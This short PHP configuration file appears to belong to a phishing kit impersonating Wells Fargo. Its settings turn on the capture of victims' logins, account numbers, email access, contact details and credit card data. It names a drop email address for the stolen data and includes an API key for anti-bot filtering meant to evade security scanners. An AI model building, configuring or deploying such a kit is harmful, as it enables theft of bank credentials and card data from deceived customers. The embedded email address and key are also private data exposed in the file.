<?php

$double_login = "yes";
$double_access = "no";

$accountnumber = "yes"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "yes";
$show_success_page = "yes";

$your_email = "robertz.perez092@gmail.com"; // Your Fucking Email Here bro !! 
$redirect = "wells"; // you can change this 

$redirection = "yes";     			   // If you won't to Use Redirection Like { Domain.com?id=wells } Make it Yes .
$api_protection = "yes";  			   // This Api For detect Frauds And Bad Bot fROM IP .
$Key = "1T1hE9XTKxb4yVBcwAgpN79sbAGvckiF"; // Your Key api protection DON't CHANGE IT BRO ...
$anti_bot = "yes";


?>